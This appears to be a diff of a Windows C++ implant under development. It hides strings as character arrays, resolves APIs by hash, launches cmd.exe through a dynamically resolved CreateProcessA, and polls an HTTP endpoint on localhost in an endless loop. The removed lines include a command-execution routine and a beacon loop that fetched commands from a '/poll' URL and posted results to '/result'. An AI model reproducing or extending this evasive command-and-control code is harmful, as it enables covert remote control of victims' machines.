@@ -327,6 +327,7 @@
 
 
 #include "HttpClient.h"
+#include <stdio.h>
 
 using namespace HttpLib;
 
@@ -356,72 +357,6 @@ using namespace HttpLib;
 //        wprintf(L"Body: %s\n", response->body);
 //    }
 //}
-//
-//std::string Exec(wchar_t* command)
-//{
-//    SECURITY_ATTRIBUTES sa{};
-//    sa.nLength = sizeof(sa);
-//    sa.bInheritHandle = TRUE;
-//
-//    HANDLE hRead = nullptr;
-//    HANDLE hWrite = nullptr;
-//
-//    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
-//        return "";
-//
-//    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
-//
-//    STARTUPINFOW si{};
-//    si.cb = sizeof(si);
-//    si.dwFlags = STARTF_USESTDHANDLES;
-//    si.hStdOutput = hWrite;
-//    si.hStdError = hWrite;
-//
-//    PROCESS_INFORMATION pi{};
-//
-//    std::wstring cmd = L"cmd.exe /c " + command;
-//
-//    // CreateProcessW yêu cầu buffer có thể ghi
-//    std::wstring cmdline = cmd;
-//
-//    BOOL ok = CreateProcessW(
-//        nullptr,
-//        cmdline.data(),
-//        nullptr,
-//        nullptr,
-//        TRUE,
-//        CREATE_NO_WINDOW,
-//        nullptr,
-//        nullptr,
-//        &si,
-//        &pi);
-//
-//    CloseHandle(hWrite);
-//
-//    if (!ok)
-//    {
-//        CloseHandle(hRead);
-//        return "";
-//    }
-//
-//    std::string output;
-//    char buffer[4096];
-//    DWORD bytesRead = 0;
-//
-//    while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, nullptr) && bytesRead)
-//    {
-//        output.append(buffer, bytesRead);
-//    }
-//
-//    WaitForSingleObject(pi.hProcess, INFINITE);
-//
-//    CloseHandle(hRead);
-//    CloseHandle(pi.hProcess);
-//    CloseHandle(pi.hThread);
-//
-//    return output;
-//}
-
 #include "ApiResolve.h"
 #include "HashString.h"
 
@@ -439,65 +374,48 @@ int main() {
     const char sDll[] = {'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', '\0'};
     pLoadLibraryA(sDll);
 	//wchar_t url[] = {L'h', L't', L't', L'p', L's', L':', L'/', L'/', L'h', L't', L't', L'p', L'b', L'i', L'n', L'.', L'o', L'r', L'g', L'/', L'g', L'e', L't', L'\0'};
-    wchar_t url[] = {L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0', L'/', L'p', L'o', L'l', L'l', L'\0'};
-    wchar_t url2[] = { L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'8', L'0', L'/', L'r', L'e', L's', L'u', L'l', L't', L'\0'};
+    wchar_t url[] = {L'h', L't', L't', L'p', L':', L'/', L'/', L'1', L'2', L'7', L'.', L'0', L'.', L'0', L'.', L'1', L':', L'8', L'0', L'\0'};
     HttpClient client;
-    STARTUPINFOW si = { 0 };
+    STARTUPINFOA si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
 
     si.cb = sizeof(si);
-    wchar_t path[] = {
-        L'C', L':', L'\\', L'\\',
-        L'W', L'i', L'n', L'd', L'o', L'w', L's',
-        L'\\', L'\\',
-        L'S', L'y', L's', L't', L'e', L'm',
-        L'3', L'2',
-        L'\\', L'\\',
-        L'c', L'm', L'd', L'.', L'e', L'x', L'e',
-        L'\0'
-        };
+    char path[] = {'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', '\0'};
     typedef BOOL
         (WINAPI*
         _CreateProcessA)(
-            LPCWSTR               lpApplicationName,
-            LPWSTR                lpCommandLine,
-            LPSECURITY_ATTRIBUTES lpProcessAttributes,
-            LPSECURITY_ATTRIBUTES lpThreadAttributes,
-            BOOL                  bInheritHandles,
-            DWORD                 dwCreationFlags,
-            LPVOID                lpEnvironment,
-            LPCWSTR               lpCurrentDirectory,
-            LPSTARTUPINFOW        lpStartupInfo,
-            LPPROCESS_INFORMATION lpProcessInformation
+            _In_opt_ LPCSTR lpApplicationName,
+            _Inout_opt_ LPSTR lpCommandLine,
+            _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
+            _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+            _In_ BOOL bInheritHandles,
+            _In_ DWORD dwCreationFlags,
+            _In_opt_ LPVOID lpEnvironment,
+            _In_opt_ LPCSTR lpCurrentDirectory,
+            _In_ LPSTARTUPINFOA lpStartupInfo,
+            _Out_ LPPROCESS_INFORMATION lpProcessInformation
         );
-    constexpr unsigned int hashCreateProcessW = ComplexHashForAnsi("CreateProcessW");
-    _CreateProcessA pCreateProcessW = (_CreateProcessA)api.GetApiAddress(lpKernel32, hashCreateProcessW);
-    //BOOL ok = pCreateProcessA(
-    //    path, // lpApplicationName
-    //    NULL,                             // lpCommandLine
-    //    NULL,                             // lpProcessAttributes
-    //    NULL,                             // lpThreadAttributes
-    //    FALSE,                            // bInheritHandles
-    //    0,                                // dwCreationFlags
-    //    NULL,                             // lpEnvironment
-    //    NULL,                             // lpCurrentDirectory
-    //    &si,                              // lpStartupInfo
-    //    &pi                               // lpProcessInformation
-    //);
+    constexpr unsigned int hashCreateProcessA = ComplexHashForAnsi("CreateProcessA");
+    _CreateProcessA pCreateProcessA = (_CreateProcessA)api.GetApiAddress(lpKernel32, hashCreateProcessA);
+    BOOL ok = pCreateProcessA(
+        path, // lpApplicationName
+        NULL,                             // lpCommandLine
+        NULL,                             // lpProcessAttributes
+        NULL,                             // lpThreadAttributes
+        FALSE,                            // bInheritHandles
+        0,                                // dwCreationFlags
+        NULL,                             // lpEnvironment
+        NULL,                             // lpCurrentDirectory
+        &si,                              // lpStartupInfo
+        &pi                               // lpProcessInformation
+    );
 
     while (1) {
         HttpResponse response;
         HttpResponse_Init(&response);
 
         client.Get(&response, url);
-
-        if (response.bodyLength) {
-            //PrintResponse(&response);
-            //std::string res = Exec(response.body);
-                        
-            client.Post(&response, url2, L"hehe", 4);
-        }
-
+        //PrintResponse(&response);
         HttpResponse_Free(&response);
     }
 
